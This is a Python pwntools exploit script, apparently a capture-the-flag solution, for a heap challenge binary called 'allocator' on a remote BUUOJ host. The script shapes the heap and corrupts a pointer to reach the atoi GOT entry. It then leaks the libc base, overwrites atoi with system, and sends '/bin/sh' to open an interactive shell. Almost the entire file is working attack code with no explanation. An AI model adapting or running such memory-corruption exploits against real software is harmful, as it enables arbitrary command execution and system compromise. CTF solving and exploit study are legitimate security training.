# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
from Crypto.Util.number import *
context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './allocator'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
#libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-arm', binary])
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '27085'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 1
    while 1 :
        try:
            i+=0
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))


def ToString(data):
    ans = 0
    for i in data[::-1]:
        ans = (ans * 2) + (ord(i) - ord('0'))
    print hex(ans)
    print long_to_bytes(ans)

def edit(idx, content):
    sla(">>", "edit({0});".format(idx))
    sa("00101110011101101010011000101110011101101111011011000110", content)

def show(idx):
    sla(">>", "show({0});".format(idx))


def free(idx):
    sla(">>", "free({0});".format(idx))


def gain(idx, size, content):
    sla(">>", "gain({0});".format(idx))
    sla("10100110010111101001011011001110:", str(size))
    sa("00101110011101101010011000101110011101101111011011000110", content)

atoi_got = elf.got['atoi']
bss_addr = 0x0000000004043A0

gain(0, 0xF00 - 0x100, 'a' * (0xf00 - 0x100))  # 0
gain(1, 0xB0, 'a' * 0xB0)  # 1
free(0)
free(1)

gain(4, 0x1e8, p64(bss_addr) + 'c' * 0x1df + "\n")  # 4
gain(5, 0xB0, 'a' * 0xb0)
gain(6, 0x131410c0,  p64(0x131410e0) + p64(0) + p64(0) + p64(0) + p64(atoi_got) + "\n")
show(2)

libc.address = l64() - libc.sym['atoi']
lg('libc.address',libc.address)
system = libc.sym['system']

edit(2, p64(system) + p64(0x401186))

sla(">>", "gain(/bin/sh);")


p.interactive()

'''
@File    :   allocator.py
@Time    :   2021/08/30 16:19:16
@Author  :   Niyah 
'''